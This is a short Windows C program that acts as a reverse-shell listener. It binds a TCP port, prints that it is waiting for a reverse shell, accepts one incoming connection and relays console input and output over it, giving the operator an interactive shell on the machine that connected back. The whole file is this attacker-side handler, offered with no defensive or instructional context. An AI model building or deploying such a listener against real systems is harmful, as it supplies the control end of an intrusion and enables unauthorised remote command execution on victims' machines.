#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib,"Ws2_32.lib")

DWORD WINAPI PumpSockToConsole(LPVOID p)
{
    SOCKET s = (SOCKET)p;
    CHAR   buf[4096]; int n;
    while ((n = recv(s, buf, sizeof(buf), 0)) > 0)
        WriteFile(GetStdHandle(STD_OUTPUT_HANDLE), buf, n, NULL, NULL);
    return 0;
}

DWORD WINAPI PumpConsoleToSock(LPVOID p)
{
    SOCKET s = *(SOCKET*)p;
    CHAR   buf[4096]; DWORD n;
    while (ReadFile(GetStdHandle(STD_INPUT_HANDLE), buf, sizeof(buf), &n, NULL) && n)
        send(s, buf, n, 0);
    return 0;
}

int main(int argc, char *argv[])
{
    int  port = 0;
    char portbuf[16] = {0};

    if (argc >= 2) port = atoi(argv[1]);         
    while (port <= 0) {                         
        printf("Listen port: ");
        fgets(portbuf, sizeof(portbuf), stdin);
        port = atoi(portbuf);
    }
    WSADATA wsa;  WSAStartup(MAKEWORD(2,2), &wsa);
    SOCKET lst = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a = {0};
    a.sin_family      = AF_INET;
    a.sin_port        = htons((u_short)port);
    a.sin_addr.s_addr = INADDR_ANY;

    bind(lst, (SOCKADDR*)&a, sizeof(a));
    listen(lst, 1);

    printf("[*] Waiting for reverse shell on port %d ...\n", port);
    SOCKET s = accept(lst, NULL, NULL);
    printf("[+] Connection established!\n");
    CreateThread(NULL,0, PumpSockToConsole,(LPVOID)s, 0, NULL);  
    SOCKET prm = s;
    CreateThread(NULL,0, PumpConsoleToSock, &prm,    0, NULL); 
    WaitForSingleObject(GetCurrentThread(), INFINITE); 
    closesocket(s); closesocket(lst); WSACleanup();
    return 0;
}
